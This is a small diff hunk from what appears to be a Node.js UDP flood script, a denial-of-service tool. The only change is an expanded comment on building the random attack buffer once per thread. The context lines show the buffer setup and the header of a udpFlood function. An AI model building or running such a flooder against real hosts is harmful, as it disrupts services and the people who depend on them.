@@ -13,7 +13,7 @@ function randStr(size) {
     return buffer.join('');
 }
 
-// generate the random alphanum string to send.
+// generate the random alphanum string to send. (once per thread, more resource effective.)
 const attackBuffer = randStr(parseInt(process.argv[4]));
 
 function udpFlood(host, port, length) {
